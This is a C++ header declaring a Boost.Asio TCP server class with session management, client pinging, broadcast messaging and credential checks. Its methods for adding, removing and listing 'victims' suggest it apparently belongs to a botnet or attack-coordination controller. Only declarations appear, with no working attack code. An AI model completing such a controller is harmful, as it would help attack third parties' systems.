#ifndef SERVER_H
#define SERVER_H

#define INACTIVITY_TIMEOUT 1 * 1000000	// 1sec
#include <unistd.h>

#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <mutex>
#include <optional>
#include <unordered_map>

#include "msg_parser.h"
#include "session.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;
class server {
    public:
	server(io::io_context &, std::uint16_t);
	void start();

	void initManager(std::string);
	void getClients();
	void getVictims();
	void addVictim(std::string);
	void removeVictim(std::string);
	void removeClient(std::string);

    private:
	void accept();
	void onAccept(err error_code);

	void handleResponse(std::string &, session *);
	void handleAlive(std::vector<std::string> &, session *);

	void sendAllClients(std::string const &);
	void pingClients();

	long int generateId();
	bool checkCredentials(std::string);

	std::future<void> routine_future_;

	io::io_context &io_context_;
	tcp::acceptor acceptor_;
	std::optional<tcp::socket> socket_;

	std::unordered_map<long int, std::shared_ptr<session>> clients_sessions_container_;
	std::mutex clients_m_;
	msg_parser msg_parser_;
	std::unordered_map<std::string, std::function<void(std::vector<std::string> &, session *)>> command_handlers_;
};

#endif	// SERVER_H